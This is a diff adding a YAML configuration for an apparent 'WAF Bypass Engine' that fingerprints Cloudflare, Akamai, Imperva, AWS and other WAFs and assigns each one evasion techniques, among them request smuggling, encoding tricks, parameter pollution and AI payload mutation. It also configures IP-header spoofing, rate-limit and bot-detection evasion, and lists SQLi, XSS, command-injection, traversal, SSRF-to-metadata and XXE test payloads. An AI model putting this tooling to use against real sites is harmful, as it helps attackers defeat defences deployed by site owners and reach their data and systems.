@@ -1,0 +1,660 @@
+# ==============================================================================
+# WAF & Cloud WAF Bypass Engine Configuration
+# ==============================================================================
+# Advanced WAF bypass techniques for Cloudflare, Akamai, Imperva, AWS WAF
+# ==============================================================================
+
+general:
+  enabled: true
+  version: "1.0.0"
+  description: "WAF Bypass Engine - Advanced evasion for cloud WAFs"
+  
+  # Default behavior
+  auto_fingerprint: true
+  aggressive_mode: false
+  learning_enabled: true
+  
+  # Rate limiting
+  max_requests_per_second: 10
+  retry_on_block: true
+  max_retries: 3
+  
+  # Logging
+  log_level: "INFO"
+  log_successful_bypasses: true
+  log_failed_attempts: false
+
+# ==============================================================================
+# WAF Vendor Profiles
+# ==============================================================================
+waf_profiles:
+  cloudflare:
+    name: "Cloudflare"
+    description: "Cloudflare WAF with Bot Management"
+    
+    # Detection signatures
+    detection:
+      headers:
+        - "cf-ray"
+        - "cf-cache-status"
+        - "__cfduid"
+        - "cf-request-id"
+        - "cf-connecting-ip"
+      cookies:
+        - "__cfduid"
+        - "__cf_bm"
+        - "cf_clearance"
+      body_patterns:
+        - "cloudflare"
+        - "ray id"
+        - "attention required"
+        - "checking your browser"
+      status_codes: [403, 503, 429]
+    
+    # Effective bypass techniques
+    effective_techniques:
+      - "unicode_normalization"
+      - "chunked_mutation"
+      - "header_injection"
+      - "mixed_encoding"
+      - "ai_mutation"
+      - "case_switching"
+    
+    # Known blocked patterns
+    blocked_patterns:
+      - "<script>"
+      - "union select"
+      - "../../../"
+      - "/etc/passwd"
+      - "cmd.exe"
+      - "powershell"
+    
+    # Features
+    features:
+      bot_detection: true
+      javascript_challenge: true
+      captcha: true
+      ml_detection: true
+      rate_limiting: true
+      
+    # Rate limits
+    rate_limit: 100  # requests per minute
+    
+    # Bypass strategies
+    strategies:
+      - name: "IP Rotation"
+        headers: ["X-Forwarded-For", "CF-Connecting-IP"]
+      - name: "User-Agent Rotation"
+        rotate_ua: true
+      - name: "Cookie Management"
+        persist_cookies: true
+
+  akamai:
+    name: "Akamai Kona Site Defender"
+    description: "Akamai WAF with Bot Manager"
+    
+    detection:
+      headers:
+        - "x-akamai-transformed"
+        - "akamai-origin-hop"
+        - "x-akamai-request-id"
+        - "x-akamai-session-info"
+      cookies:
+        - "ak_bmsc"
+        - "bm_sv"
+        - "bm_sz"
+        - "_abck"
+      body_patterns:
+        - "akamai"
+        - "access denied"
+        - "reference #"
+      status_codes: [403]
+    
+    effective_techniques:
+      - "http2_smuggling"
+      - "double_url_encode"
+      - "hpp_duplicate"
+      - "comment_injection"
+      - "whitespace_manipulation"
+    
+    blocked_patterns:
+      - "xss"
+      - "sqli"
+      - "command injection"
+      - "path traversal"
+    
+    features:
+      bot_detection: true
+      javascript_challenge: false
+      captcha: true
+      ml_detection: true
+      rate_limiting: true
+      
+    rate_limit: 50
+    
+    strategies:
+      - name: "Sensor Data Spoofing"
+        spoof_sensors: true
+      - name: "TLS Fingerprint"
+        randomize_ja3: true
+
+  imperva:
+    name: "Imperva Incapsula"
+    description: "Imperva Cloud WAF"
+    
+    detection:
+      headers:
+        - "x-iinfo"
+        - "x-cdn"
+        - "x-incap-session"
+      cookies:
+        - "incap_ses"
+        - "visid_incap"
+        - "nlbi_"
+        - "incap_ses_"
+      body_patterns:
+        - "imperva"
+        - "incapsula"
+        - "incident id"
+        - "request unsuccessful"
+      status_codes: [403]
+    
+    effective_techniques:
+      - "te_cl_desync"
+      - "mixed_encoding"
+      - "case_switching"
+      - "whitespace_manipulation"
+      - "null_byte_injection"
+    
+    blocked_patterns:
+      - "<script"
+      - "onerror"
+      - "onload"
+      - "union"
+      - "select"
+    
+    features:
+      bot_detection: true
+      javascript_challenge: true
+      captcha: true
+      ml_detection: false
+      rate_limiting: true
+      
+    rate_limit: 60
+
+  aws_waf:
+    name: "AWS WAF"
+    description: "Amazon Web Services WAF"
+    
+    detection:
+      headers:
+        - "x-amzn-requestid"
+        - "x-amz-cf-id"
+        - "x-amz-cf-pop"
+        - "x-amz-request-id"
+      cookies: []
+      body_patterns:
+        - "aws"
+        - "request blocked"
+        - "access denied"
+      status_codes: [403]
+    
+    effective_techniques:
+      - "overlong_utf8"
+      - "chunked_extension"
+      - "json_pollution"
+      - "null_byte_injection"
+      - "unicode_normalization"
+    
+    blocked_patterns:
+      - "sqli"
+      - "xss"
+      - "rce"
+      - "traversal"
+    
+    features:
+      bot_detection: false
+      javascript_challenge: false
+      captcha: false
+      ml_detection: true
+      rate_limiting: true
+      
+    rate_limit: 2000
+
+  azure_waf:
+    name: "Azure Application Gateway WAF"
+    description: "Microsoft Azure WAF"
+    
+    detection:
+      headers:
+        - "x-azure-ref"
+        - "x-ms-request-id"
+      cookies: []
+      body_patterns:
+        - "azure"
+        - "microsoft"
+        - "request blocked"
+      status_codes: [403]
+    
+    effective_techniques:
+      - "double_url_encode"
+      - "mixed_encoding"
+      - "hpp_array"
+      - "xml_pollution"
+    
+    features:
+      bot_detection: false
+      javascript_challenge: false
+      captcha: false
+      ml_detection: true
+      rate_limiting: true
+
+  gcp_armor:
+    name: "Google Cloud Armor"
+    description: "Google Cloud Platform WAF"
+    
+    detection:
+      headers:
+        - "x-goog-"
+        - "x-cloud-trace-context"
+      cookies: []
+      body_patterns:
+        - "google"
+        - "cloud armor"
+      status_codes: [403]
+    
+    effective_techniques:
+      - "unicode_normalization"
+      - "chunked_mutation"
+      - "case_switching"
+    
+    features:
+      bot_detection: true
+      javascript_challenge: false
+      captcha: true
+      ml_detection: true
+      rate_limiting: true
+
+  f5_bigip:
+    name: "F5 BIG-IP ASM"
+    description: "F5 Networks Application Security Manager"
+    
+    detection:
+      headers:
+        - "x-wa-info"
+        - "x-cnection"
+      cookies:
+        - "TS"
+        - "BIGipServer"
+        - "BigIPServer"
+      body_patterns:
+        - "f5"
+        - "request rejected"
+        - "the requested url was rejected"
+      status_codes: [403]
+    
+    effective_techniques:
+      - "http2_smuggling"
+      - "xml_pollution"
+      - "html_entity"
+      - "host_override"
+    
+    features:
+      bot_detection: true
+      javascript_challenge: false
+      captcha: true
+      ml_detection: true
+      rate_limiting: true
+
+  modsecurity:
+    name: "ModSecurity"
+    description: "Open Source WAF (OWASP CRS)"
+    
+    detection:
+      headers:
+        - "server"
+      cookies: []
+      body_patterns:
+        - "mod_security"
+        - "modsecurity"
+        - "not acceptable"
+        - "security"
+      status_codes: [403, 406]
+    
+    effective_techniques:
+      - "utf7_encoding"
+      - "concatenation_bypass"
+      - "hpp_array"
+      - "double_url_encode"
+      - "comment_injection"
+    
+    features:
+      bot_detection: false
+      javascript_challenge: false
+      captcha: false
+      ml_detection: false
+      rate_limiting: false
+
+  sucuri:
+    name: "Sucuri CloudProxy"
+    description: "Sucuri Website Firewall"
+    
+    detection:
+      headers:
+        - "x-sucuri-id"
+        - "x-sucuri-cache"
+      cookies:
+        - "sucuri_cloudproxy"
+      body_patterns:
+        - "sucuri"
+        - "cloudproxy"
+        - "access denied"
+        - "website firewall"
+      status_codes: [403]
+    
+    effective_techniques:
+      - "unicode_normalization"
+      - "mixed_encoding"
+      - "whitespace_manipulation"
+    
+    features:
+      bot_detection: true
+      javascript_challenge: true
+      captcha: false
+      ml_detection: false
+      rate_limiting: true
+
+# ==============================================================================
+# Bypass Techniques Configuration
+# ==============================================================================
+techniques:
+  # HTTP Request Smuggling
+  http_smuggling:
+    enabled: true
+    techniques:
+      cl_te_desync:
+        description: "Content-Length vs Transfer-Encoding desync"
+        risk_level: "high"
+        success_rate: 0.7
+      te_cl_desync:
+        description: "Transfer-Encoding vs Content-Length desync"
+        risk_level: "high"
+        success_rate: 0.65
+      te_te_desync:
+        description: "Transfer-Encoding obfuscation"
+        risk_level: "medium"
+        success_rate: 0.6
+      http2_smuggling:
+        description: "HTTP/2 to HTTP/1.1 downgrade smuggling"
+        risk_level: "high"
+        success_rate: 0.75
+      h2c_smuggling:
+        description: "HTTP/2 cleartext upgrade smuggling"
+        risk_level: "medium"
+        success_rate: 0.5
+
+  # Encoding Attacks
+  encoding:
+    enabled: true
+    techniques:
+      unicode_normalization:
+        description: "Unicode fullwidth and homoglyph substitution"
+        success_rate: 0.8
+        example: "< → \uff1c"
+      double_url_encode:
+        description: "Double URL encoding"
+        success_rate: 0.6
+        example: "< → %253c"
+      mixed_encoding:
+        description: "Combined URL + Unicode + HTML encoding"
+        success_rate: 0.75
+      overlong_utf8:
+        description: "Overlong UTF-8 encoding attack"
+        success_rate: 0.5
+      utf7_encoding:
+        description: "UTF-7 encoding bypass"
+        success_rate: 0.4
+      html_entity:
+        description: "HTML entity encoding variations"
+        success_rate: 0.7
+
+  # Parameter Pollution
+  parameter_pollution:
+    enabled: true
+    techniques:
+      hpp_duplicate:
+        description: "HTTP Parameter Pollution - duplicate params"
+        success_rate: 0.65
+      hpp_array:
+        description: "Array notation pollution (param[])"
+        success_rate: 0.55
+      json_pollution:
+        description: "JSON duplicate key pollution"
+        success_rate: 0.6
+      xml_pollution:
+        description: "XML element/attribute pollution"
+        success_rate: 0.5
+
+  # Payload Mutation
+  mutation:
+    enabled: true
+    techniques:
+      case_switching:
+        description: "Random case variation"
+        success_rate: 0.5
+      null_byte_injection:
+        description: "Null byte insertion"
+        success_rate: 0.55
+      comment_injection:
+        description: "SQL/HTML comment injection"
+        success_rate: 0.7
+      whitespace_manipulation:
+        description: "Alternative whitespace characters"
+        success_rate: 0.6
+      concatenation_bypass:
+        description: "String concatenation tricks"
+        success_rate: 0.65
+
+  # AI-Powered
+  ai_mutation:
+    enabled: true
+    description: "AI-powered payload mutation"
+    model: "gpt-4"
+    temperature: 0.7
+    max_mutations: 10
+    success_rate: 0.8
+
+# ==============================================================================
+# Attack Type Configurations
+# ==============================================================================
+attack_types:
+  sqli:
+    name: "SQL Injection"
+    priority_techniques:
+      - "comment_injection"
+      - "case_switching"
+      - "unicode_normalization"
+      - "whitespace_manipulation"
+    test_payloads:
+      - "' OR 1=1--"
+      - "' UNION SELECT NULL--"
+      - "1' AND '1'='1"
+      - "admin'--"
+
+  xss:
+    name: "Cross-Site Scripting"
+    priority_techniques:
+      - "html_entity"
+      - "unicode_normalization"
+      - "case_switching"
+      - "mixed_encoding"
+    test_payloads:
+      - "<script>alert(1)</script>"
+      - "<img src=x onerror=alert(1)>"
+      - "<svg onload=alert(1)>"
+      - "javascript:alert(1)"
+
+  rce:
+    name: "Remote Code Execution"
+    priority_techniques:
+      - "concatenation_bypass"
+      - "whitespace_manipulation"
+      - "null_byte_injection"
+      - "double_url_encode"
+    test_payloads:
+      - "; cat /etc/passwd"
+      - "| id"
+      - "$(whoami)"
+      - "`id`"
+
+  lfi:
+    name: "Local File Inclusion"
+    priority_techniques:
+      - "double_url_encode"
+      - "null_byte_injection"
+      - "unicode_normalization"
+      - "path_truncation"
+    test_payloads:
+      - "../../etc/passwd"
+      - "....//....//etc/passwd"
+      - "..%252f..%252fetc/passwd"
+
+  ssrf:
+    name: "Server-Side Request Forgery"
+    priority_techniques:
+      - "unicode_normalization"
+      - "dns_rebinding"
+      - "ip_obfuscation"
+    test_payloads:
+      - "http://127.0.0.1"
+      - "http://localhost"
+      - "http://169.254.169.254"
+
+  xxe:
+    name: "XML External Entity"
+    priority_techniques:
+      - "parameter_entity"
+      - "dtd_injection"
+      - "encoding_bypass"
+    test_payloads:
+      - "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"
+
+# ==============================================================================
+# Rate Limit Bypass Configuration
+# ==============================================================================
+rate_limit_bypass:
+  enabled: true
+  
+  header_rotation:
+    enabled: true
+    headers:
+      - "X-Forwarded-For"
+      - "X-Real-IP"
+      - "X-Originating-IP"
+      - "X-Client-IP"
+      - "CF-Connecting-IP"
+      - "True-Client-IP"
+      - "X-Cluster-Client-IP"
+      - "Forwarded-For"
+      - "Forwarded"
+    
+    ip_ranges:
+      private:
+        - "10.0.0.0/8"
+        - "172.16.0.0/12"
+        - "192.168.0.0/16"
+      cloud:
+        - "35.0.0.0/8"      # Google
+        - "52.0.0.0/8"      # AWS
+        - "104.0.0.0/8"     # Cloudflare
+
+  user_agent_rotation:
+    enabled: true
+    agents:
+      chrome:
+        - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
+        - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
+      firefox:
+        - "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
+        - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0"
+      safari:
+        - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
+      mobile:
+        - "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148"
+        - "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36"
+
+  timing:
+    random_delay:
+      min_ms: 100
+      max_ms: 3000
+    exponential_backoff:
+      enabled: true
+      base_ms: 1000
+      max_ms: 60000
+      multiplier: 2
+    jitter:
+      enabled: true
+      percent: 25
+
+# ==============================================================================
+# Bot Detection Bypass
+# ==============================================================================
+bot_bypass:
+  enabled: true
+  
+  browser_headers:
+    required:
+      - "Accept"
+      - "Accept-Language"
+      - "Accept-Encoding"
+      - "Connection"
+    
+    sec_headers:
+      - "Sec-Fetch-Dest"
+      - "Sec-Fetch-Mode"
+      - "Sec-Fetch-Site"
+      - "Sec-Fetch-User"
+      - "Sec-CH-UA"
+      - "Sec-CH-UA-Mobile"
+      - "Sec-CH-UA-Platform"
+  
+  tls_fingerprint:
+    randomize_ja3: true
+    cipher_suites:
+      - "TLS_AES_128_GCM_SHA256"
+      - "TLS_AES_256_GCM_SHA384"
+      - "TLS_CHACHA20_POLY1305_SHA256"
+  
+  javascript_challenges:
+    # Note: Requires headless browser for full bypass
+    solver_enabled: false
+    solver_type: "selenium"  # or "playwright"
+    timeout_seconds: 30
+
+# ==============================================================================
+# Output & Logging
+# ==============================================================================
+output:
+  format: "json"  # json, text, csv
+  include_original: true
+  include_technique: true
+  include_probability: true
+  
+  file_output:
+    enabled: false
+    path: "/tmp/waf_bypass_results.json"
+  
+  statistics:
+    track_success_rate: true
+    track_by_technique: true
+    track_by_waf: true
+
+logging:
+  level: "INFO"
+  format: "[%(asctime)s] [%(levelname)s] %(message)s"
+  
+  file:
+    enabled: true
+    path: "/tmp/waf_bypass.log"
+    max_size_mb: 50
+    backup_count: 3
